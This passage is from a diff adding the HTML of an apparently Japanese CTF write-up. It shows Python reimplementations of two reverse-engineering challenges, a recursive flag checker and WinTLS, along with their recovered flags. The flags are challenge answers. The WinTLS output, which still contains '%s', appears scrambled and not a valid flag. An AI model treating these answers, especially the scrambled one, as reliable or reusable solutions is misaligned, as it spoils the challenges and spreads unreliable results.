class=mh>0x6d</span><span class=p>,</span> <span class=mh>0x28</span><span class=p>,</span> <span class=mh>0x25</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x77</span><span class=p>,</span> <span class=mh>0x28</span><span class=p>,</span> <span class=mh>0x3c</span><span class=p>,</span> <span class=mh>0x68</span><span class=p>,</span> <span class=mh>0x3a</span><span class=p>,</span> <span class=mh>0x31</span><span class=p>,</span> <span class=mh>0x21</span><span class=p>,</span> <span class=mh>0x63</span><span class=p>,</span> <span class=mh>0x27</span><span class=p>,</span> <span class=mh>0x72</span><span class=p>,</span> <span class=mh>0x75</span><span class=p>,</span> <span class=mh>0x76</span><span class=p>,</span> <span class=mh>0x7d</span><span class=p>,</span> <span class=mh>0x40</span><span class=p>,</span> <span class=mh>0x33</span><span class=p>,</span> <span class=mh>0x60</span><span class=p>,</span> <span class=mh>0x79</span><span class=p>,</span> <span class=mh>0x61</span><span class=p>,</span> <span class=mh>0x21</span><span class=p>,</span> <span class=mh>0x72</span><span class=p>,</span> <span class=mh>0x35</span><span class=p>,</span> <span class=mh>0x26</span><span class=p>,</span> <span class=mh>0x3b</span><span class=p>,</span> <span class=mh>0x35</span><span class=p>,</span> <span class=mh>0x7a</span><span class=p>,</span> <span class=mh>0x5f</span><span class=p>,</span> <span class=mh>0x6f</span><span class=p>,</span> <span class=mh>0x67</span><span class=p>,</span> <span class=mh>0x6d</span><span class=p>,</span> <span class=mh>0x30</span><span class=p>,</span> <span class=mh>0x61</span><span class=p>,</span> <span class=mh>0x39</span><span class=p>,</span> <span class=mh>0x63</span><span class=p>,</span> <span class=mh>0x32</span><span class=p>,</span> <span class=mh>0x33</span><span class=p>,</span> <span class=mh>0x73</span><span class=p>,</span> <span class=mh>0x6d</span><span class=p>,</span> <span class=mh>0x77</span><span class=p>,</span> <span class=mh>0x2d</span><span class=p>,</span> <span class=mh>0x2e</span><span class=p>,</span> <span class=mh>0x69</span><span class=p>,</span> <span class=mh>0x23</span><span class=p>,</span> <span class=mh>0x7c</span><span class=p>,</span> <span class=mh>0x77</span><span class=p>,</span> <span class=mh>0x7b</span><span class=p>,</span> <span class=mh>0x38</span><span class=p>,</span> <span class=mh>0x6b</span><span class=p>,</span> <span class=mh>0x65</span><span class=p>,</span> <span class=mh>0x70</span><span class=p>,</span> <span class=mh>0x66</span><span class=p>,</span> <span class=mh>0x76</span><span class=p>,</span> <span class=mh>0x77</span><span class=p>,</span> <span class=mh>0x3a</span><span class=p>,</span> <span class=mh>0x33</span><span class=p>,</span> <span class=mh>0x7c</span><span class=p>,</span> <span class=mh>0x33</span><span class=p>,</span> <span class=mh>0x66</span><span class=p>,</span> <span class=mh>0x35</span><span class=p>,</span> <span class=mh>0x3c</span><span class=p>,</span> <span class=mh>0x65</span><span class=p>,</span> <span class=mh>0x40</span><span class=p>,</span> <span class=mh>0x3a</span><span class=p>,</span> <span class=mh>0x7d</span><span class=p>,</span> <span class=mh>0x2a</span><span class=p>,</span> <span class=mh>0x2c</span><span class=p>,</span> <span class=mh>0x71</span><span class=p>,</span> <span class=mh>0x3e</span><span class=p>,</span> <span class=mh>0x73</span><span class=p>,</span> <span class=mh>0x67</span><span class=p>,</span> <span class=mh>0x21</span><span class=p>,</span> <span class=mh>0x62</span><span class=p>,</span> <span class=mh>0x64</span><span class=p>,</span> <span class=mh>0x6b</span><span class=p>,</span> <span class=mh>0x72</span><span class=p>,</span> <span class=mh>0x30</span><span class=p>,</span> <span class=mh>0x78</span><span class=p>,</span> <span class=mh>0x37</span><span class=p>,</span> <span class=mh>0x40</span><span class=p>,</span> <span class=mh>0x3e</span><span class=p>,</span> <span class=mh>0x68</span><span class=p>,</span> <span class=mh>0x2f</span><span class=p>,</span> <span class=mh>0x35</span><span class=p>,</span> <span class=mh>0x2a</span><span class=p>,</span> <span class=mh>0x68</span><span class=p>,</span> <span class=mh>0x69</span><span class=p>,</span> <span class=mh>0x3c</span><span class=p>,</span> <span class=mh>0x37</span><span class=p>,</span> <span class=mh>0x34</span><span class=p>,</span> <span class=mh>0x39</span><span class=p>,</span> <span class=mh>0x27</span><span class=p>,</span> <span class=mh>0x7c</span><span class=p>,</span> <span class=mh>0x7b</span><span class=p>,</span> <span class=mh>0x29</span><span class=p>,</span> <span class=mh>0x73</span><span class=p>,</span> <span class=mh>0x6a</span><span class=p>,</span> <span class=mh>0x31</span><span class=p>,</span> <span class=mh>0x3b</span><span class=p>,</span> <span class=mh>0x30</span><span class=p>,</span> <span class=mh>0x2c</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x69</span><span class=p>,</span> <span class=mh>0x67</span><span class=p>,</span> <span class=mh>0x26</span><span class=p>,</span> <span class=mh>0x76</span><span class=p>,</span> <span class=mh>0x29</span><span class=p>,</span> <span class=mh>0x3d</span><span class=p>,</span> <span class=mh>0x74</span><span class=p>,</span> <span class=mh>0x30</span><span class=p>,</span> <span class=mh>0x66</span><span class=p>,</span> <span class=mh>0x6e</span><span class=p>,</span> <span class=mh>0x6b</span><span class=p>,</span> <span class=mh>0x7c</span><span class=p>,</span> <span class=mh>0x30</span><span class=p>,</span> <span class=mh>0x33</span><span class=p>,</span> <span class=mh>0x6a</span><span class=p>,</span> <span class=mh>0x22</span><span class=p>,</span> <span class=mh>0x7d</span><span class=p>,</span> <span class=mh>0x37</span><span class=p>,</span> <span class=mh>0x72</span><span class=p>,</span> <span class=mh>0x7b</span><span class=p>,</span> <span class=mh>0x7d</span><span class=p>,</span> <span class=mh>0x74</span><span class=p>,</span> <span class=mh>0x69</span><span class=p>,</span> <span class=mh>0x7d</span><span class=p>,</span> <span class=mh>0x3f</span><span class=p>,</span> <span class=mh>0x5f</span><span class=p>,</span> <span class=mh>0x3c</span><span class=p>,</span> <span class=mh>0x73</span><span class=p>,</span> <span class=mh>0x77</span><span class=p>,</span> <span class=mh>0x78</span><span class=p>,</span> <span class=mh>0x6a</span><span class=p>,</span> <span class=mh>0x75</span><span class=p>,</span> <span class=mh>0x31</span><span class=p>,</span> <span class=mh>0x6b</span><span class=p>,</span> <span class=mh>0x21</span><span class=p>,</span> <span class=mh>0x6c</span><span class=p>,</span> <span class=mh>0x26</span><span class=p>,</span> <span class=mh>0x64</span><span class=p>,</span> <span class=mh>0x62</span><span class=p>,</span> <span class=mh>0x21</span><span class=p>,</span> <span class=mh>0x6a</span><span class=p>,</span> <span class=mh>0x3a</span><span class=p>,</span> <span class=mh>0x7d</span><span class=p>,</span> <span class=mh>0x21</span><span class=p>,</span> <span class=mh>0x7a</span><span class=p>,</span> <span class=mh>0x7d</span><span class=p>,</span> <span class=mh>0x36</span><span class=p>,</span> <span class=mh>0x2a</span><span class=p>,</span> <span class=mh>0x60</span><span class=p>,</span> <span class=mh>0x31</span><span class=p>,</span> <span class=mh>0x5f</span><span class=p>,</span> <span class=mh>0x7b</span><span class=p>,</span> <span class=mh>0x66</span><span class=p>,</span> <span class=mh>0x31</span><span class=p>,</span> <span class=mh>0x73</span><span class=p>,</span> <span class=mh>0x40</span><span class=p>,</span> <span class=mh>0x33</span><span class=p>,</span> <span class=mh>0x64</span><span class=p>,</span> <span class=mh>0x2c</span><span class=p>,</span> <span class=mh>0x76</span><span class=p>,</span> <span class=mh>0x69</span><span class=p>,</span> <span class=mh>0x6f</span><span class=p>,</span> <span class=mh>0x34</span><span class=p>,</span> <span class=mh>0x35</span><span class=p>,</span> <span class=mh>0x3c</span><span class=p>,</span> <span class=mh>0x5f</span><span class=p>,</span> <span class=mh>0x34</span><span class=p>,</span> <span class=mh>0x76</span><span class=p>,</span> <span class=mh>0x63</span><span class=p>,</span> <span class=mh>0x5f</span><span class=p>,</span> <span class=mh>0x76</span><span class=p>,</span> <span class=mh>0x33</span><span class=p>,</span> <span class=mh>0x3e</span><span class=p>,</span> <span class=mh>0x68</span><span class=p>,</span> <span class=mh>0x75</span><span class=p>,</span> <span class=mh>0x33</span><span class=p>,</span> <span class=mh>0x3e</span><span class=p>,</span> <span class=mh>0x2b</span><span class=p>,</span> <span class=mh>0x62</span><span class=p>,</span> <span class=mh>0x79</span><span class=p>,</span> <span class=mh>0x76</span><span class=p>,</span> <span class=mh>0x71</span><span class=p>,</span> <span class=mh>0x23</span><span class=p>,</span> <span class=mh>0x23</span><span class=p>,</span> <span class=mh>0x40</span><span class=p>,</span> <span class=mh>0x66</span><span class=p>,</span> <span class=mh>0x2b</span><span class=p>,</span> <span class=mh>0x29</span><span class=p>,</span> <span class=mh>0x6c</span><span class=p>,</span> <span class=mh>0x63</span><span class=p>,</span> <span class=mh>0x39</span><span class=p>,</span> <span class=mh>0x31</span><span class=p>,</span> <span class=mh>0x77</span><span class=p>,</span> <span class=mh>0x2b</span><span class=p>,</span> <span class=mh>0x39</span><span class=p>,</span> <span class=mh>0x69</span><span class=p>,</span> <span class=mh>0x37</span><span class=p>,</span> <span class=mh>0x23</span><span class=p>,</span> <span class=mh>0x76</span><span class=p>,</span> <span class=mh>0x3c</span><span class=p>,</span> <span class=mh>0x72</span><span class=p>,</span> <span class=mh>0x3b</span><span class=p>,</span> <span class=mh>0x72</span><span class=p>,</span> <span class=mh>0x72</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x75</span><span class=p>,</span> <span class=mh>0x40</span><span class=p>,</span> <span class=mh>0x28</span><span class=p>,</span> <span class=mh>0x61</span><span class=p>,</span> <span class=mh>0x74</span><span class=p>,</span> <span class=mh>0x3e</span><span class=p>,</span> <span class=mh>0x76</span><span class=p>,</span> <span class=mh>0x6e</span><span class=p>,</span> <span class=mh>0x3a</span><span class=p>,</span> <span class=mh>0x37</span><span class=p>,</span> <span class=mh>0x62</span><span class=p>,</span> <span class=mh>0x60</span><span class=p>,</span> <span class=mh>0x6a</span><span class=p>,</span> <span class=mh>0x73</span><span class=p>,</span> <span class=mh>0x6d</span><span class=p>,</span> <span class=mh>0x67</span><span class=p>,</span> <span class=mh>0x36</span><span class=p>,</span> <span class=mh>0x6d</span><span class=p>,</span> <span class=mh>0x79</span><span class=p>,</span> <span class=mh>0x7b</span><span class=p>,</span> <span class=mh>0x2b</span><span class=p>,</span> <span class=mh>0x39</span><span class=p>,</span> <span class=mh>0x6d</span><span class=p>,</span> <span class=mh>0x5f</span><span class=p>,</span> <span class=mh>0x2d</span><span class=p>,</span> <span class=mh>0x72</span><span class=p>,</span> <span class=mh>0x79</span><span class=p>,</span> <span class=mh>0x70</span><span class=p>,</span> <span class=mh>0x70</span><span class=p>,</span> <span class=mh>0x5f</span><span class=p>,</span> <span class=mh>0x75</span><span class=p>,</span> <span class=mh>0x35</span><span class=p>,</span> <span class=mh>0x6e</span><span class=p>,</span> <span class=mh>0x2a</span><span class=p>,</span> <span class=mh>0x36</span><span class=p>,</span> <span class=mh>0x2e</span><span class=p>,</span> <span class=mh>0x7d</span><span class=p>,</span> <span class=mh>0x66</span><span class=p>,</span> <span class=mh>0x38</span><span class=p>,</span> <span class=mh>0x70</span><span class=p>,</span> <span class=mh>0x70</span><span class=p>,</span> <span class=mh>0x67</span><span class=p>,</span> <span class=mh>0x3c</span><span class=p>,</span> <span class=mh>0x6d</span><span class=p>,</span> <span class=mh>0x2d</span><span class=p>,</span> <span class=mh>0x26</span><span class=p>,</span> <span class=mh>0x71</span><span class=p>,</span> <span class=mh>0x71</span><span class=p>,</span> <span class=mh>0x35</span><span class=p>,</span> <span class=mh>0x6b</span><span class=p>,</span> <span class=mh>0x33</span><span class=p>,</span> <span class=mh>0x66</span><span class=p>,</span> <span class=mh>0x3f</span><span class=p>,</span> <span class=mh>0x3d</span><span class=p>,</span> <span class=mh>0x75</span><span class=p>,</span> <span class=mh>0x31</span><span class=p>,</span> <span class=mh>0x7d</span><span class=p>,</span> <span class=mh>0x6d</span><span class=p>,</span> <span class=mh>0x5f</span><span class=p>,</span> <span class=mh>0x3f</span><span class=p>,</span> <span class=mh>0x6e</span><span class=p>,</span> <span class=mh>0x39</span><span class=p>,</span> <span class=mh>0x3c</span><span class=p>,</span> <span class=mh>0x7c</span><span class=p>,</span> <span class=mh>0x65</span><span class=p>,</span> <span class=mh>0x74</span><span class=p>,</span> <span class=mh>0x2a</span><span class=p>,</span> <span class=mh>0x2d</span><span class=p>,</span> <span class=mh>0x2f</span><span class=p>,</span> <span class=mh>0x25</span><span class=p>,</span> <span class=mh>0x66</span><span class=p>,</span> <span class=mh>0x67</span><span class=p>,</span> <span class=mh>0x68</span><span class=p>,</span> <span class=mh>0x2e</span><span class=p>,</span> <span class=mh>0x31</span><span class=p>,</span> <span class=mh>0x6d</span><span class=p>,</span> <span class=mh>0x28</span><span class=p>,</span> <span class=mh>0x40</span><span class=p>,</span> <span class=mh>0x5f</span><span class=p>,</span> <span class=mh>0x33</span><span class=p>,</span> <span class=mh>0x76</span><span class=p>,</span> <span class=mh>0x66</span><span class=p>,</span> <span class=mh>0x34</span><span class=p>,</span> <span class=mh>0x69</span><span class=p>,</span> <span class=mh>0x28</span><span class=p>,</span> <span class=mh>0x6e</span><span class=p>,</span> <span class=mh>0x29</span><span class=p>,</span> <span class=mh>0x73</span><span class=p>,</span> <span class=mh>0x32</span><span class=p>,</span> <span class=mh>0x6a</span><span class=p>,</span> <span class=mh>0x76</span><span class=p>,</span> <span class=mh>0x67</span><span class=p>,</span> <span class=mh>0x30</span><span class=p>,</span> <span class=mh>0x6d</span><span class=p>,</span> <span class=mh>0x34</span><span class=p>]</span>
+
+<span class=k>def</span> <span class=nf>check</span><span class=p>(</span><span class=n>st</span><span class=p>,</span> <span class=n>i</span><span class=p>,</span> <span class=n>orig</span><span class=p>):</span>
+    <span class=n>iVar3</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=n>st</span><span class=p>)</span>
+    <span class=k>if</span> <span class=n>iVar3</span> <span class=o>==</span> <span class=mi>1</span><span class=p>:</span>
+        <span class=k>if</span> <span class=n>table</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>!=</span> <span class=n>st</span><span class=p>[</span><span class=mi>0</span><span class=p>]:</span>
+            <span class=c1># print(&#34;orig = &#34;,orig ,&#34;i = &#34;, i, &#34; table = &#34;, table[i])</span>
+            <span class=nb>print</span><span class=p>(</span><span class=nb>chr</span><span class=p>(</span><span class=n>table</span><span class=p>[</span><span class=n>i</span><span class=p>]),</span> <span class=n>end</span><span class=o>=</span><span class=s2>&#34;&#34;</span><span class=p>)</span>
+            <span class=k>return</span> <span class=mi>0</span>
+    <span class=k>else</span><span class=p>:</span>
+        <span class=n>iVar1</span> <span class=o>=</span> <span class=n>iVar3</span> <span class=o>//</span> <span class=mi>2</span>
+        <span class=n>_dest</span> <span class=o>=</span> <span class=n>st</span><span class=p>[:</span><span class=n>iVar1</span><span class=p>]</span>
+        <span class=n>iVar2</span> <span class=o>=</span> <span class=n>check</span><span class=p>(</span><span class=n>_dest</span><span class=p>,</span> <span class=n>i</span><span class=p>,</span> <span class=n>orig</span><span class=p>)</span>
+        <span class=k>if</span> <span class=n>iVar2</span> <span class=o>==</span> <span class=mi>1</span><span class=p>:</span>
+            <span class=k>return</span> <span class=mi>1</span>
+        <span class=n>_dest</span> <span class=o>=</span> <span class=n>st</span><span class=p>[</span><span class=n>iVar1</span><span class=p>:]</span>
+        <span class=n>i</span> <span class=o>=</span> <span class=n>iVar1</span><span class=o>*</span><span class=n>iVar1</span> <span class=o>+</span> <span class=n>i</span>
+        <span class=n>iVar3</span> <span class=o>=</span> <span class=n>check</span><span class=p>(</span><span class=n>_dest</span><span class=p>,</span> <span class=n>i</span><span class=p>,</span> <span class=n>orig</span><span class=o>+</span><span class=n>iVar1</span><span class=p>)</span>
+        <span class=k>if</span> <span class=n>iVar3</span> <span class=o>==</span> <span class=mi>1</span><span class=p>:</span>
+            <span class=k>return</span> <span class=mi>1</span>
+    <span class=k>return</span> <span class=mi>0</span>
+
+
+<span class=n>check</span><span class=p>(</span><span class=s2>&#34;ctf</span><span class=si>{aaaxaaaxaaaxaaaxaaaxaaaxaaaxxaaxa}</span><span class=s2>&#34;</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span>
+
+</code></pre></div><p><code>ctf4b{r3curs1v3_c4l1_1s_4_v3ry_u53fu1}</code></p>
+<h3 id=wintls>WinTLS</h3>
+<p>Windowsバイナリのrev問</p>
+<p>なんでexe?と思ったら、TLSは<a href=https://docs.microsoft.com/ja-jp/windows/win32/procthread/using-thread-local-storage>スレッド局所記憶</a>というのらしい</p>
+<p>要はstoreでしょと思ってget/setをghidraで追いかける</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text>TlsSetValue(TLS,&#34;tfb%s$T9NvFyroLh@89a9yoC3rPy&amp;3b}&#34;);
+
+TlsSetValue(TLS,&#34;c4{fAPu8#FHh2+0cyo8$SWJH3a8X&#34;);
+</code></pre></div><p>怪しい～～～！！！なんかおぼろげながら <code>ctf4b</code> が見える</p>
+<p>追いかけていくとfizzbuzzみたいなことしてたのでpythonで書き直す</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=n>text1</span> <span class=o>=</span> <span class=s2>&#34;c4{fAPu8#FHh2+0cyo8$SWJH3a8X&#34;</span> <span class=c1># ==3 || == 5</span>
+<span class=n>text2</span> <span class=o>=</span> <span class=s2>&#34;tfb</span><span class=si>%s</span><span class=s2>$T9NvFyroLh@89a9yoC3rPy&amp;3b}&#34;</span> <span class=c1># != 3 &amp;&amp; != 5</span>
+
+<span class=n>ans</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
+<span class=n>ind1</span> <span class=o>=</span> <span class=mi>0</span>
+<span class=n>ind2</span> <span class=o>=</span> <span class=mi>0</span>
+<span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>text1</span><span class=o>+</span><span class=n>text2</span><span class=p>)):</span>
+    <span class=k>if</span> <span class=n>i</span> <span class=o>%</span><span class=mi>3</span> <span class=o>==</span> <span class=mi>0</span> <span class=ow>or</span> <span class=n>i</span><span class=o>%</span><span class=mi>5</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
+        <span class=n>ans</span> <span class=o>+=</span> <span class=n>text1</span><span class=p>[</span><span class=n>ind1</span><span class=p>]</span>
+        <span class=n>ind1</span> <span class=o>+=</span> <span class=mi>1</span>
+    <span class=k>else</span><span class=p>:</span>
+        <span class=n>ans</span> <span class=o>+=</span> <span class=n>text2</span><span class=p>[</span><span class=n>ind2</span><span class=p>]</span>
+        <span class=n>ind2</span><span class=o>+=</span> <span class=mi>1</span>
+<span class=nb>print</span><span class=p>(</span><span class=n>ans</span><span class=p>)</span>
+</code></pre></div><p><code>ctf4b{f%sAP$uT98Nv#FFHyrh2o+Lh0@8c9yoa98$ySoCW3rJPH3y&a83Xb}</code></p>
+<h2 id=終わりに>終わりに</h2>
+<p>　もう解けんしええかと早めに切り上げるのをやめて、ずっと格闘できたのが収穫でした。<br>
+　運営の皆様、楽しいCTFをありがとうございました。</p>
+</article>
+<footer>
+<p class=license>
+This document is licensed under
+<a href=https://creativecommons.org/licenses/by/4.0/ target=_blank rel="noopener noreferrer">CC-BY-4.0</a>
+</p>
+<p class=repository>
+<a href=https://github.com/uta8a/discussion/discussions/1 target=_blank rel="noopener noreferrer">discussion</a>にコメントする
+</p>
+</footer>
+</main>
+</body>
+</html>
